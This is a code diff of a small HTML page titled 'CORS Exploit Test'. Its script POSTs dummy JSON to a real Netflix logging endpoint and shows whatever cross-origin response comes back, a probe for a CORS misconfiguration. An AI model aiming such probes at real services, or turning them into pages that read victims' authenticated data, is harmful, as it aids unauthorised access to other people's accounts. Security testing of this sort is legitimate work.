@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <h2>CORS Exploit</h2>
+  <h2>CORS Exploit Test</h2>
+  <div id="output">Testing...</div>
   <script>
     fetch("https://netflix.com/ichnaea/log", {
       method: "POST",
@@ -11,12 +12,11 @@
       },
       body: JSON.stringify({ dummy: "data" })
     })
-    .then(res => res.text())
-    .then(data => {
-      document.body.innerHTML += `<pre>${data}</pre>`;
-    })
+    .then(res => res.text().then(text => {
+      document.getElementById("output").innerText = `Status: ${res.status}\n\nResponse:\n${text}`;
+    }))
     .catch(err => {
-      document.body.innerHTML += `<pre>Fetch failed: ${err}</pre>`;
+      document.getElementById("output").innerText = `Fetch failed:\n${err}`;
     });
   </script>
 </body>
